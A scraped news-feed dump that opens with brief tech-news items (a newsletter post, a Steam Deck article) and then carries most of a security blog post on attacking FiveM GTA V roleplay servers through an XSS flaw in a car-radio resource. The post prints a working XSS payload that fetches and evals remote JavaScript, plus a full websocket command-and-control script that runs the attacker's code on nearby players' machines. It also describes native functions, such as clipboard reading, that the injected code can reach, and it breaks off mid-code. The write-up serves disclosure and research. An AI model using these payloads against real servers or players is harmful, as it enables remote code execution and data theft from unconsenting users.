data-attrs="{&quot;url&quot;:&quot;https://www.supervised.news/p/mapreduce-tensorflow-bard-also-hello?utm_source=substack&amp;utm_medium=email&amp;utm_content=share&amp;action=share&quot;,&quot;text&quot;:&quot;Share&quot;,&quot;action&quot;:null,&quot;class&quot;:null}" data-component-name="ButtonCreateButton"><a href="https://www.supervised.news/p/mapreduce-tensorflow-bard-also-hello?utm_source=substack&amp;utm_medium=email&amp;utm_content=share&amp;action=share" rel=""><span>Share</span></a></p><p><strong><a href="https://www.theverge.com/2023/8/29/23849056/google-meet-ai-duet-attend-for-me" rel="">Google Meet’s new AI will be able to go to meetings for you (The Verge)</a></strong><span>: Google’s quest to turn Duet into a personal AI assistant continues in the form of creating a meeting buddy that lets you ignore your meetings. Most meetings didn’t have to be meetings in the first place, but this is at least a way to pretend that it was important for whomever called the meeting together in the first place.</span></p><p><strong><a href="https://www.deepmind.com/blog/identifying-ai-generated-images-with-synthid" rel="">Identifying AI-generated images with SynthID (DeepMind)</a></strong><span>: One of the single-biggest challenges the industry faces is finding some way to identify whether a piece of content was generated by AI or a real human. Most of the tools have turned out to be highly </span><em>in</em><span>effective, but watermarking has generally been seen as one workaround for it. One shot at that is coming out of DeepMind in the form of SynthID, a watermarking system for identify whether an image was generated by a generative AI model.</span></p><p><strong><a href="https://techcrunch.com/2023/08/29/google-cloud-announces-the-5th-generation-of-its-custom-tpus/" rel="">Google Cloud announces the 5th generation of its custom TPUs (TechCrunch)</a></strong><span>: Google is coming out with an updated TPU that it says doubles the last version’s performance-per-dollar (that’s a weird one) in training. At the same time, Nvidia is working with Google to put its hardware inside Google Cloud. It’s pretty clear Google sees a future where both of these kinds of hardware work in tandem, and it’ll continue to put out new versions of its own processor.</span></p><p><strong><a href="https://www.theverge.com/2023/8/29/23819494/apple-september-event-iphone-15-pro-watch-ultra-date" rel="">Apple announces the iPhone 15 launch event (The Verge)</a></strong><span>: So this is more of a product-y thing usually, but I really think Apple is going to be making some kind of AI-type announcement here because </span><em>it simply has to</em><span>. Apple has been working on GPT-ish models internally and clearly has a lot of interest getting one onto a phone. While it usually reserves its software updates for WWDC in the summer, it wouldn’t be surprising to see a generative model end up exclusively on new iPhones in the form of something like “you need the newest neural engine to use it.”</span></p><p><strong><a href="https://openai.com/blog/introducing-chatgpt-enterprise" rel="">Introducing ChatGPT Enterprise (OpenAI)</a></strong><span>: OpenAI is implementing its semi-expected two-tiered approach for GPT-4 by launching a new enterprise tier. It talks about a large number of the kind of table stakes-y features needed for most enterprises around security and privacy, but really this comes down to rate limiting. OpenAI says the enterprise tier gets double the performance and unlimited usage—which basically seems like code for “you won’t get rate limited or see performance degradation.”</span></p><p><em>If you have any tips, please send me a note at m@supervised.news or contact me directly on Signal at +1-415-690-7086. As always, please send any and all feedback my way.</em></p></div></article></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Linux overtakes Mac as Steam's second-most used OS, thanks to the Steam Deck (245 pts)]]></title>
            <link>https://www.pcgamer.com/linux-overtakes-mac-as-steams-second-most-used-os-and-its-all-thanks-to-the-steam-deck/</link>
            <guid>37312001</guid>
            <pubDate>Tue, 29 Aug 2023 18:37:16 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.pcgamer.com/linux-overtakes-mac-as-steams-second-most-used-os-and-its-all-thanks-to-the-steam-deck/">https://www.pcgamer.com/linux-overtakes-mac-as-steams-second-most-used-os-and-its-all-thanks-to-the-steam-deck/</a>, See on <a href="https://news.ycombinator.com/item?id=37312001">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="article-body">
<p>Linux has surpassed macOS as the second-most used operating system on Steam according to the latest <a href="https://store.steampowered.com/hwsurvey/" target="_blank" data-url="https://store.steampowered.com/hwsurvey/">Steam Hardware &amp; Software Survey</a> from July. While Linux remains a distant second place to top dog Windows, it's still seen a rapid increase in adoption among Steam users almost entirely attributable to the Linux-based Steam Deck.</p><p>As <a href="https://arstechnica.com/gadgets/2023/08/linux-surpasses-the-mac-among-steam-gamers/" target="_blank" data-url="https://arstechnica.com/gadgets/2023/08/linux-surpasses-the-mac-among-steam-gamers/">Ars Technica</a> points out, the Deck's SteamOS version of Linux accounts for a whopping 42% of reported <a href="https://store.steampowered.com/hwsurvey/?platform=linux" target="_blank" data-url="https://store.steampowered.com/hwsurvey/?platform=linux">Linux users on Steam</a>, with Arch Linux lagging far behind in second place at 7.94% adoption. Windows still absolutely dominates the overall field at 96.21% of users, with all versions of Linux at 1.96% and macOS hanging out down at 1.84%.</p><p>It's another feather in the cap of the Deck, which is consistently one of the best-selling items on Steam overall, currently holding down the #6 spot according to <a href="https://steamdb.info/stats/globaltopsellers/" target="_blank" data-url="https://steamdb.info/stats/globaltopsellers/">SteamDB</a>. As for Linux more broadly, I do wonder if the Deck's success will spur more adoption of the more hardcore, DIY OS ecosystem.&nbsp;</p><p>A friend of mine who's dabbled in being a Linux Guy was excited about the Steam Deck's prospects of improving Linux-based gaming more broadly, and the Proton compatibility layer Valve developed for the Deck certainly seems like a game changer for the <a href="https://www.gamingonlinux.com/" target="_blank" data-url="https://www.gamingonlinux.com/">Gaming on Linux</a> crowd.</p><p>In my own personal experience though, loving the Steam Deck didn't make me into a Linux Guy, it just made me into a Steam Deck Guy. Still, everybody wins here. Linux Guys get all kinds of new options with Proton, and I get to play Baldur's Gate 3 on my upcoming international flight⁠—be sure to check out our guide to playing <a href="https://www.pcgamer.com/baldurs-gate-3-steam-deck-compatibility-performance/" target="_blank">Baldur's Gate 3 on Steam Deck</a> if you're having trouble running Larian's massive new RPG on the handheld.</p>
</div><div data-hydrate="true" id="slice-container-newsletterForm-articleInbodyContent"><section><p>Sign up to get the best content of the week, and great gaming deals, as picked by the editors.</p></section></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Hacking GTA V RP Servers Using Web Exploitation Techniques (129 pts)]]></title>
            <link>https://www.nullpt.rs/hacking-gta-servers-using-web-exploitation</link>
            <guid>37311975</guid>
            <pubDate>Tue, 29 Aug 2023 18:35:16 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.nullpt.rs/hacking-gta-servers-using-web-exploitation">https://www.nullpt.rs/hacking-gta-servers-using-web-exploitation</a>, See on <a href="https://news.ycombinator.com/item?id=37311975">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><p>As of 2023, Grand Theft Auto V remains the second best-selling video game at 185,000,000 units sold, second to Minecraft<sup><a href="#user-content-fn-earnings" id="user-content-fnref-earnings" data-footnote-ref="true" aria-describedby="footnote-label">1</a></sup>.
Its success can largely be attributed to the game's online multiplayer mode, GTA Online, which allows players to explore a sandboxed
world with friends and strangers alike. Although the playable world and content is vast, the experience is quickly degraded due to the
peer-to-peer nature of the game. The client-sided nature of the game allows for a plethora of exploits, including the ability to crash
players, spawn vehicles, and even corrupt other's accounts. The lack of player-led servers also means that the game
can not be modded in the traditional sense.</p>
<figure><video width="320" height="240" controls=""><source src="https://www.nullpt.rs/posts/hacking-gta-servers-using-web-exploitation-techniques/hackers.mp4" type="video/mp4"><p>Your browser does not support the video tag.</p></video><figcaption>Hackers ruining the GTA Online experience</figcaption></figure>
<h2>Introducing FiveM</h2>
<p>FiveM is an open source third-party multiplayer mod by Cfx.re<sup><a href="#user-content-fn-cfx-acquired" id="user-content-fnref-cfx-acquired" data-footnote-ref="true" aria-describedby="footnote-label">2</a></sup>, which allows players to create or connect to dedicated servers.
These servers can be modded to the creator's liking, and can be used to create custom game modes, maps, and otherwise impossible experiences.
A popular example of this is roleplay servers, which allows players to roleplay as civilians, police officers, and criminals.
These experiences are created with game modifications known as "resources". Resources on a roleplay server can be used to allow for the
custom creation of vehicles, custom interiors &amp; exteriors, drug-dealing mechanics, and more.</p>
<p>These resources can built using Lua, C#, or JavaScript. A typical setup would use Lua to handle server-side actions and JavaScript to display
custom user interfaces. These scripts communicate through <a href="https://docs.fivem.net/docs/scripting-manual/nui-development/">NUI</a> callbacks which allow interoperability between the Chromium Embedded Framework that
renders the custom interfaces and the Lua scripting engine.</p>
<h2>Finding Servers</h2>
<figure><img alt="FiveM server list" sizes="100vw" srcset="https://www.nullpt.rs/_next/image?url=%2Fposts%2Fhacking-gta-servers-using-web-exploitation-techniques%2Fserver-list.png&amp;w=640&amp;q=75 640w, https://www.nullpt.rs/_next/image?url=%2Fposts%2Fhacking-gta-servers-using-web-exploitation-techniques%2Fserver-list.png&amp;w=750&amp;q=75 750w, https://www.nullpt.rs/_next/image?url=%2Fposts%2Fhacking-gta-servers-using-web-exploitation-techniques%2Fserver-list.png&amp;w=828&amp;q=75 828w, https://www.nullpt.rs/_next/image?url=%2Fposts%2Fhacking-gta-servers-using-web-exploitation-techniques%2Fserver-list.png&amp;w=1080&amp;q=75 1080w, https://www.nullpt.rs/_next/image?url=%2Fposts%2Fhacking-gta-servers-using-web-exploitation-techniques%2Fserver-list.png&amp;w=1200&amp;q=75 1200w, https://www.nullpt.rs/_next/image?url=%2Fposts%2Fhacking-gta-servers-using-web-exploitation-techniques%2Fserver-list.png&amp;w=1920&amp;q=75 1920w, https://www.nullpt.rs/_next/image?url=%2Fposts%2Fhacking-gta-servers-using-web-exploitation-techniques%2Fserver-list.png&amp;w=2048&amp;q=75 2048w, https://www.nullpt.rs/_next/image?url=%2Fposts%2Fhacking-gta-servers-using-web-exploitation-techniques%2Fserver-list.png&amp;w=3840&amp;q=75 3840w" src="https://www.nullpt.rs/_next/image?url=%2Fposts%2Fhacking-gta-servers-using-web-exploitation-techniques%2Fserver-list.png&amp;w=3840&amp;q=75" width="100" height="100" decoding="async" data-nimg="1" loading="lazy"><figcaption>FiveM server list</figcaption></figure>
<p>FiveM aggregates a list of servers that can be filtered by various criteria such as name, region, player count, etc...
Selecting a server allows you to view it in more detail, revealing the list of resources, and allowing you to connect
through the click of a button.</p>
<figure><img alt="Detailed server view" sizes="100vw" srcset="https://www.nullpt.rs/_next/image?url=%2Fposts%2Fhacking-gta-servers-using-web-exploitation-techniques%2Fdetailed-list.png&amp;w=640&amp;q=75 640w, https://www.nullpt.rs/_next/image?url=%2Fposts%2Fhacking-gta-servers-using-web-exploitation-techniques%2Fdetailed-list.png&amp;w=750&amp;q=75 750w, https://www.nullpt.rs/_next/image?url=%2Fposts%2Fhacking-gta-servers-using-web-exploitation-techniques%2Fdetailed-list.png&amp;w=828&amp;q=75 828w, https://www.nullpt.rs/_next/image?url=%2Fposts%2Fhacking-gta-servers-using-web-exploitation-techniques%2Fdetailed-list.png&amp;w=1080&amp;q=75 1080w, https://www.nullpt.rs/_next/image?url=%2Fposts%2Fhacking-gta-servers-using-web-exploitation-techniques%2Fdetailed-list.png&amp;w=1200&amp;q=75 1200w, https://www.nullpt.rs/_next/image?url=%2Fposts%2Fhacking-gta-servers-using-web-exploitation-techniques%2Fdetailed-list.png&amp;w=1920&amp;q=75 1920w, https://www.nullpt.rs/_next/image?url=%2Fposts%2Fhacking-gta-servers-using-web-exploitation-techniques%2Fdetailed-list.png&amp;w=2048&amp;q=75 2048w, https://www.nullpt.rs/_next/image?url=%2Fposts%2Fhacking-gta-servers-using-web-exploitation-techniques%2Fdetailed-list.png&amp;w=3840&amp;q=75 3840w" src="https://www.nullpt.rs/_next/image?url=%2Fposts%2Fhacking-gta-servers-using-web-exploitation-techniques%2Fdetailed-list.png&amp;w=3840&amp;q=75" width="100" height="100" decoding="async" data-nimg="1" loading="lazy"><figcaption>Detailed server view</figcaption></figure>
<p>After viewing several servers from this list, <code>rcore_radiocar</code> was a resource that piqued my interest. This allowed
players to specify YouTube and SoundCloud links to broadcast music from the player's car to other nearby players.</p>
<p>My initial thought was, it may be possible to leak player's IPs by specifying a URL that I controlled. To my surprise,
this worked. I wasn't yet sure of how this resource worked under the hood and since it was paid I couldn't easily sift
through the source. Or so I thought.</p>
<h2>CEF Remote Debugging</h2>
<p>FiveM exposes the CEF Remote Debugging interface on <code>localhost:13172</code>. This allows us to inspect and debug the resource's
code for handling the user interface with ease. Each resource is loaded into its own <code>iframe</code>.</p>
<figure><img alt="Debugging the Chromium Embedded Framework view of a FiveM server" sizes="100vw" srcset="https://www.nullpt.rs/_next/image?url=%2Fposts%2Fhacking-gta-servers-using-web-exploitation-techniques%2Fcef.png&amp;w=640&amp;q=75 640w, https://www.nullpt.rs/_next/image?url=%2Fposts%2Fhacking-gta-servers-using-web-exploitation-techniques%2Fcef.png&amp;w=750&amp;q=75 750w, https://www.nullpt.rs/_next/image?url=%2Fposts%2Fhacking-gta-servers-using-web-exploitation-techniques%2Fcef.png&amp;w=828&amp;q=75 828w, https://www.nullpt.rs/_next/image?url=%2Fposts%2Fhacking-gta-servers-using-web-exploitation-techniques%2Fcef.png&amp;w=1080&amp;q=75 1080w, https://www.nullpt.rs/_next/image?url=%2Fposts%2Fhacking-gta-servers-using-web-exploitation-techniques%2Fcef.png&amp;w=1200&amp;q=75 1200w, https://www.nullpt.rs/_next/image?url=%2Fposts%2Fhacking-gta-servers-using-web-exploitation-techniques%2Fcef.png&amp;w=1920&amp;q=75 1920w, https://www.nullpt.rs/_next/image?url=%2Fposts%2Fhacking-gta-servers-using-web-exploitation-techniques%2Fcef.png&amp;w=2048&amp;q=75 2048w, https://www.nullpt.rs/_next/image?url=%2Fposts%2Fhacking-gta-servers-using-web-exploitation-techniques%2Fcef.png&amp;w=3840&amp;q=75 3840w" src="https://www.nullpt.rs/_next/image?url=%2Fposts%2Fhacking-gta-servers-using-web-exploitation-techniques%2Fcef.png&amp;w=3840&amp;q=75" width="100" height="100" decoding="async" data-nimg="1" loading="lazy"><figcaption>Debugging the Chromium Embedded Framework view of a FiveM server</figcaption></figure>
<p>A quick peek into the resource we're curious about reveals a relatively straightforward file tree.</p>
<pre><code><span>rcore_radiocar
</span><span>└── html
</span><span>    ├── css
</span><span>    │&nbsp;&nbsp; ├── reset.css
</span><span>    │&nbsp;&nbsp; └── style.css
</span><span>    ├── index.html
</span><span>    └── scripts
</span><span>        ├── SoundPlayer.js
</span><span>        ├── class.js
</span><span>        ├── functions.js
</span><span>        ├── listener.js
</span><span>        └── vue.min.js
</span></code></pre>
<p>A peek into <code>SoundPlayer.js</code> reveals the functionality for how the music gets played on the client-side.
This logic is handled inside of the <code>create()</code> function:</p>
<pre><code><span><span>create</span><span>(</span><span>)</span>
</span><span>	<span>{</span>
</span><span>        <span>// ...</span>
</span><span>	    <span>var</span> link <span>=</span> <span>getYoutubeUrlId</span><span>(</span><span>this</span><span>.</span><span>getUrlSound</span><span>(</span><span>)</span><span>)</span><span>;</span>
</span><span>        <span>if</span><span>(</span>link <span>===</span> <span>""</span><span>)</span>
</span><span>        <span>{</span>
</span><span>            <span>this</span><span>.</span><span>isYoutube</span> <span>=</span> <span>false</span><span>;</span>
</span><span>
</span><span>            <span>this</span><span>.</span><span>audioPlayer</span> <span>=</span> <span>new</span> <span>Howl</span><span>(</span><span>{</span>
</span><span>                <span>src</span><span>:</span> <span>[</span><span>this</span><span>.</span><span>getUrlSound</span><span>(</span><span>)</span><span>]</span><span>,</span>
</span><span>                <span>loop</span><span>:</span> <span>false</span><span>,</span>
</span><span>                <span>html5</span><span>:</span> <span>true</span><span>,</span>
</span><span>                <span>autoplay</span><span>:</span> <span>false</span><span>,</span>
</span><span>                <span>volume</span><span>:</span> <span>0.0</span><span>,</span>
</span><span>                <span>format</span><span>:</span> <span>[</span><span>'mp3'</span><span>]</span><span>,</span>
</span><span>                <span>onend</span><span>:</span> <span>function</span><span>(</span><span>event</span><span>)</span><span>{</span>
</span><span>                    <span>ended</span><span>(</span><span>null</span><span>)</span><span>;</span>
</span><span>                <span>}</span><span>,</span>
</span><span>                <span>onplay</span><span>:</span> <span>function</span><span>(</span><span>)</span><span>{</span>
</span><span>                    <span>isReady</span><span>(</span><span>"nothing"</span><span>,</span> <span>true</span><span>)</span><span>;</span>
</span><span>                <span>}</span><span>,</span>
</span><span>            <span>}</span><span>)</span><span>;</span>
</span><span>            <span>$</span><span>(</span><span>"#"</span> <span>+</span> <span>this</span><span>.</span><span>div_id</span><span>)</span><span>.</span><span>remove</span><span>(</span><span>)</span><span>;</span>
</span><span>            <span>$</span><span>(</span><span>"body"</span><span>)</span><span>.</span><span>append</span><span>(</span><span>"&lt;div id = '"</span><span>+</span> <span>this</span><span>.</span><span>div_id</span> <span>+</span><span>"' style='display:none'&gt;"</span><span>+</span><span>this</span><span>.</span><span>getUrlSound</span><span>(</span><span>)</span> <span>+</span><span>"&lt;/div&gt;"</span><span>)</span>
</span><span>        <span>}</span>
</span><span>        <span>else</span>
</span><span>        <span>{</span>
</span><span>            <span>// ...</span>
</span><span>        <span>}</span>
</span><span>	<span>}</span>
</span></code></pre>
<p>The resource attempts to extract a YouTube ID from the URL (e.g: extract <code>D7DVSZ_poHk</code> from <code>https://www.youtube.com/watch?v=D7DVSZ_poHk</code>).
If an ID cannot be extracted, it is treated as an unknown source and uses audio library <a href="https://howlerjs.com/">Howler.js</a> to parse and play
the audio. Afterwards, the resource <em>graciously</em> appends our sound's URL to the DOM using JQuery's <code>append</code> function.</p>
<p>If it wasn't immediately obvious, this screams vulnerable to XSS. Since the user is able to specify any URL, an attacker is
able to craft an XSS payload and execute arbitrary JavaScript on player's machines.</p>
<p>To test this theory, I crafted an XSS payload that did exactly this. Using a purposefully erroneous <code>img</code> tag, we're able to use the <code>onerror</code>
attribute to fetch a larger payload and execute it using JavaScript's <code>eval</code> function.</p>
<p>The XSS payload reads as such:</p>
<pre><code><span><span><span><span>&lt;</span>img</span> <span>src</span><span><span>=</span><span>"</span>#<span>"</span></span> <span><span>onerror</span><span><span>=</span><span>'</span><span><span>fetch</span><span>(</span><span><span>`</span><span>https://[redacted].com/payload.js</span><span>`</span></span><span>)</span><span>.</span><span>then</span><span>(</span><span>res</span><span>=&gt;</span>res<span>.</span><span>text</span><span>(</span><span>)</span><span>.</span><span>then</span><span>(</span><span>r</span><span>=&gt;</span><span>eval</span><span>(</span>r<span>)</span><span>)</span><span>)</span></span><span>'</span></span></span> <span><span>style</span><span><span>=</span><span>"</span><span><span>display</span><span>:</span>none</span><span>"</span></span></span> <span>/&gt;</span></span>
</span></code></pre>
<p>The actual loaded payload contains logic to connect the player to a websocket that I control so that we're able to feed arbitrary
JavaScript through a control panel.</p>
<p>The injected payload reads as follows:</p>
<pre><code><span>globalThis<span>.</span><span>serverName</span> <span>=</span> <span>'default'</span><span>;</span>
</span><span>globalThis<span>.</span><span>lastPing</span> <span>=</span> <span>Date</span><span>.</span><span>now</span><span>(</span><span>)</span>
</span><span>
</span><span><span>const</span> <span>sendMessage</span> <span>=</span> <span>(</span><span>socket<span>,</span> message</span><span>)</span> <span>=&gt;</span> socket<span>.</span><span>send</span><span>(</span><span>JSON</span><span>.</span><span>stringify</span><span>(</span>message<span>)</span><span>)</span><span>;</span>
</span><span>
</span><span><span>const</span> <span>pingCommand</span> <span>=</span> <span>(</span><span>_<span>,</span> socket</span><span>)</span> <span>=&gt;</span> <span>{</span>
</span><span>  globalThis<span>.</span><span>lastPing</span> <span>=</span> <span>Date</span><span>.</span><span>now</span><span>(</span><span>)</span><span>;</span>
</span><span>  <span>sendMessage</span><span>(</span>socket<span>,</span> <span>{</span> <span>type</span><span>:</span> <span>"pong"</span> <span>}</span><span>)</span><span>;</span>
</span><span><span>}</span>
</span><span>
</span><span><span>const</span> <span>evalCommand</span> <span>=</span> <span>(</span><span><span>{</span> code <span>}</span><span>,</span> socket</span><span>)</span> <span>=&gt;</span> <span>{</span>
</span><span>  <span>const</span> returned <span>=</span> <span>eval</span><span>(</span>code<span>)</span><span>;</span> <span>// Execute the code sent from our server on the player's machine</span>
</span><span>  <span>sendMessage</span><span>(</span>socket<span>,</span> <span>{</span> <span>type</span><span>:</span> <span>"evaled"</span><span>,</span> <span>returned</span><span>:</span> <span><span>`</span><span><span>${</span>returned<span>}</span></span><span>`</span></span> <span>}</span><span>)</span><span>;</span>
</span><span><span>}</span><span>;</span>
</span><span>
</span><span>globalThis<span>.</span><span>commands</span> <span>=</span> <span>{</span>
</span><span>  <span>eval</span><span>:</span> evalCommand<span>,</span>
</span><span>  <span>ping</span><span>:</span> pingCommand<span>,</span>
</span><span><span>}</span>
</span><span>
</span><span>globalThis<span>.</span><span>start</span> <span>??=</span> <span>(</span><span>)</span> <span>=&gt;</span> <span>{</span>
</span><span>  <span>if</span> <span>(</span>globalThis<span>.</span><span>socket</span><span>)</span> <span>{</span>
</span><span>    <span>return</span><span>;</span>
</span><span>  <span>}</span>
</span><span>
</span><span>  <span>const</span> socket <span>=</span> <span>new</span> <span>WebSocket</span><span>(</span><span><span>`</span><span>wss://[redacted]/connect/</span><span><span>${</span>globalThis<span>.</span><span>serverName</span><span>}</span></span><span>`</span></span><span>)</span><span>;</span>
</span><span>  globalThis<span>.</span><span>socket</span> <span>=</span> socket<span>;</span>
</span><span>
</span><span>  <span>const</span> <span>closed</span> <span>=</span> <span>(</span><span>)</span> <span>=&gt;</span> <span>{</span>
</span><span>    globalThis<span>.</span><span>socket</span> <span>=</span> <span>undefined</span><span>;</span>
</span><span>    <span>setTimeout</span><span>(</span><span>(</span><span>)</span> <span>=&gt;</span> globalThis<span>.</span><span>start</span><span>(</span><span>)</span><span>,</span> <span>500</span><span>)</span>
</span><span>  <span>}</span><span>;</span>
</span><span>  socket<span>.</span><span>onclose</span> <span>=</span> closed<span>;</span>
</span><span>  socket<span>.</span><span>onerror</span> <span>=</span> closed<span>;</span>
</span><span>  socket<span>.</span><span>onmessage</span> <span>=</span> <span>(</span><span><span>{</span> data <span>}</span></span><span>)</span> <span>=&gt;</span> <span>{</span>
</span><span>    <span>if</span> <span>(</span><span>!</span>data<span>)</span> <span>return</span><span>;</span>
</span><span>
</span><span>    <span>const</span> <span>{</span> type<span>,</span> <span>...</span>rest <span>}</span> <span>=</span> <span>JSON</span><span>.</span><span>parse</span><span>(</span>data<span>)</span><span>;</span>
</span><span>    globalThis<span>.</span><span>commands</span><span>[</span>type<span>]</span><span>?.</span><span>(</span>rest<span>,</span> socket<span>)</span><span>;</span>
</span><span>  <span>}</span><span>;</span>
</span><span><span>}</span>
</span><span>
</span><span>globalThis<span>.</span><span>start</span><span>(</span><span>)</span><span>;</span>
</span></code></pre>
<p>The only thing left was to test this. The plan goes as follows:</p>
<ol>
<li>Find a server with the <code>xsound</code> and <code>rcore_radiocar</code> resource.</li>
<li>Get inside of a vehicle</li>
<li>Run the <code>/radiocar</code> command and drop the XSS payload</li>
<li>Profit???</li>
</ol>
<p>Now, a video demonstrating the exploit:</p>
<figure><video width="320" height="240" controls=""><source src="https://www.nullpt.rs/posts/hacking-gta-servers-using-web-exploitation-techniques/xss-demo.mp4" type="video/mp4"><p>Your browser does not support the video tag.</p></video><figcaption>XSS payload being dropped and tested using various scripts</figcaption></figure>
<p>As I roam the city in my car, nearby players are attempting to play the music from the URL being
broadcasted by my car. Since this "URL" is a maliciously crafted payload, they are instead connecting
to my websocket awaiting further command.</p>
<h2>Further commands</h2>
<p>FiveM exposes various functions to the CEF browser. One handy function, <code>window.invokeNative</code>, can be used to
execute certain tasks in C++-land. A peek into <code>components/nui-core/src/NUICallbacks_Native.cpp</code> tells us what
we can do.</p>
<pre><code><span>client<span>-&gt;</span><span>AddProcessMessageHandler</span><span>(</span><span>"invokeNative"</span><span>,</span> <span>[</span><span>]</span> <span>(</span>CefRefPtr<span>&lt;</span>CefBrowser<span>&gt;</span> browser<span>,</span> CefRefPtr<span>&lt;</span>CefProcessMessage<span>&gt;</span> message<span>)</span>
</span><span>  <span>{</span>
</span><span>    <span>auto</span> args <span>=</span> message<span>-&gt;</span><span>GetArgumentList</span><span>(</span><span>)</span><span>;</span>
</span><span>    <span>auto</span> nativeType <span>=</span> args<span>-&gt;</span><span>GetString</span><span>(</span><span>0</span><span>)</span><span>;</span>
</span><span>
</span><span>    nui<span>::</span><span>OnInvokeNative</span><span>(</span>nativeType<span>.</span><span>c_str</span><span>(</span><span>)</span><span>,</span> <span>ToWide</span><span>(</span>args<span>-&gt;</span><span>GetString</span><span>(</span><span>1</span><span>)</span><span>.</span><span>ToString</span><span>(</span><span>)</span><span>)</span><span>.</span><span>c_str</span><span>(</span><span>)</span><span>)</span><span>;</span>
</span><span>
</span><span>    <span>if</span> <span>(</span>nativeType <span>==</span> <span>"quit"</span><span>)</span>
</span><span>    <span>{</span>
</span><span>      <span>// TODO: CEF shutdown and native stuff related to it (set a shutdown flag)</span>
</span><span>      <span>ExitProcess</span><span>(</span><span>0</span><span>)</span><span>;</span>
</span><span>    <span>}</span>
</span><span>    <span>else</span> <span>if</span> <span>(</span>nativeType <span>==</span> <span>"openUrl"</span><span>)</span>
</span><span>    <span>{</span>
</span><span>      std<span>::</span>string arg <span>=</span> args<span>-&gt;</span><span>GetString</span><span>(</span><span>1</span><span>)</span><span>.</span><span>ToString</span><span>(</span><span>)</span><span>;</span>
</span><span>
</span><span>      <span>if</span> <span>(</span>arg<span>.</span><span>find</span><span>(</span><span>"http://"</span><span>)</span> <span>==</span> <span>0</span> <span>||</span> arg<span>.</span><span>find</span><span>(</span><span>"https://"</span><span>)</span> <span>==</span> <span>0</span><span>)</span>
</span><span>      <span>{</span>
</span><span>        <span>ShellExecute</span><span>(</span><span>nullptr</span><span>,</span> L<span>"open"</span><span>,</span> <span>ToWide</span><span>(</span>arg<span>)</span><span>.</span><span>c_str</span><span>(</span><span>)</span><span>,</span> <span>nullptr</span><span>,</span> <span>nullptr</span><span>,</span> SW_SHOWNORMAL<span>)</span><span>;</span>
</span><span>      <span>}</span>
</span><span>    <span>}</span>
</span><span>    <span>else</span> <span>if</span> <span>(</span>nativeType <span>==</span> <span>"setConvar"</span> <span>||</span> nativeType <span>==</span> <span>"setArchivedConvar"</span><span>)</span>
</span><span>    <span>{</span>
</span><span>      <span>if</span> <span>(</span>nui<span>::</span><span>HasMainUI</span><span>(</span><span>)</span><span>)</span>
</span><span>      <span>{</span>
</span><span>        <span>// code to set convars, however this only works in the main menu.</span>
</span><span>      <span>}</span>
</span><span>    <span>}</span>
</span><span>    <span>else</span> <span>if</span> <span>(</span>nativeType <span>==</span> <span>"getConvars"</span><span>)</span>
</span><span>    <span>{</span>
</span><span>      <span>if</span> <span>(</span>nui<span>::</span><span>HasMainUI</span><span>(</span><span>)</span><span>)</span>
</span><span>      <span>{</span>
</span><span>        <span>// code to get convars, however this only works in the main menu.</span>
</span><span>      <span>}</span>
</span><span>    <span>}</span>
</span><span>    <span>return</span> <span>true</span><span>;</span>
</span><span><span>}</span><span>)</span><span>;</span>
</span></code></pre>
<ul>
<li><code>openUrl</code>: Self explanatory, opens a URL by running <code>ShellExecute</code> with the <code>open</code> parameter.
Thankfully, the argument is checked to ensure it's a URL before executing the command to prevent
arbitrary command execution.</li>
<li><code>quit</code>: Also self explanatory, shutdown the game.</li>
</ul>
<p>Other functions existing on the <code>window</code> object include bangers such as:</p>
<ul>
<li><code>window.fxdkClipboardRead</code>: Read the user's clipboard, completely bypassing the Chromium permissions
model.</li>
</ul>
<pre><code><span>nuiApp<span>-&gt;</span><span>AddV8Handler</span><span>(</span><span>"fxdkClipboardRead"</span><span>,</span> <span>[</span><span>]</span><span>(</span><span>const</span> CefV8ValueList<span>&amp;</span> arguments<span>,</span> CefString<span>&amp;</span> exception<span>)</span>
</span><span>	<span>{</span>
</span><span>		<span>if</span> <span>(</span><span>OpenClipboard</span><span>(</span><span>nullptr</span><span>)</span><span>)</span>
</span><span>		<span>{</span>
</span><span>			ClipboardCloser closer<span>;</span>
</span><span>
</span><span>			<span>if</span> <span>(</span>HANDLE ptr <span>=</span> <span>GetClipboardData</span><span>(</span>CF_UNICODETEXT<span>)</span><span>)</span>
</span><span>			<span>{</span>
</span><span>				<span>if</span> <span>(</span><span>wchar_t</span><span>*</span> text <span>=</span> <span><span>static_cast</span><span><span>&lt;</span><span>wchar_t</span><span>*</span><span>&gt;</span></span></span><span>(</span><span>GlobalLock</span><span>(</span>ptr<span>)</span><span>)</span><span>)</span>
</span><span>				<span>{</span>
</span><span>					std<span>::</span>wstring <span>textString</span><span>(</span>text<span>)</span><span>;</span>
</span><span>
</span><span>					<span>GlobalUnlock</span><span>(</span>ptr<span>)</span><span>;</span>
</span><span>
</span><span>					<span>return</span> <span>CefV8Value</span><span>::</span><span>CreateString</span><span>(</span>textString<span>)</span><span>;</span>
</span><span>				<span>}</span>
</span><span>			<span>}</span>
</span><span>		<span>}</span>
</span><span>		<span>return</span> <span>CefV8Value</span><span>::</span><span>CreateString</span><span>(</span><span>""</span><span>)</span><span>;</span>
</span><span>	<span>}</span><span>)</span><span>;</span>
</span></code></pre>
<ul>
<li><code>window.fxdkClipboardWrite</code>: Write to the user's clipboard.</li>
</ul>
<p>As of May 27 2023, the clipboard functions are no longer accessible. Presumably due
to misuse by malicious server admins &amp; resource developers.</p>
<h2>The DOM</h2>
<p>Since the exploit lives in the DOM with isolation disabled, we're also able to hijack other resource's iframes.</p>
<h3>Make users send chat messages</h3>
<p>A peek into <code>chat/html/App.js</code> tells us how in-game messages are handled:</p>
<pre><code><span><span>// window.post defined in chat/html/index.html</span>
</span><span><span>window</span><span>.</span><span>post</span> <span>=</span> <span>(</span><span>url<span>,</span> data</span><span>)</span> <span>=&gt;</span> <span>{</span>
</span><span>  <span>var</span> request <span>=</span> <span>new</span> <span>XMLHttpRequest</span><span>(</span><span>)</span><span>;</span>
</span><span>  request<span>.</span><span>open</span><span>(</span><span>'POST'</span><span>,</span> url<span>,</span> <span>true</span><span>)</span><span>;</span>
</span><span>  request<span>.</span><span>setRequestHeader</span><span>(</span><span>'Content-Type'</span><span>,</span> <span>'application/json; charset=UTF-8'</span><span>)</span><span>;</span>
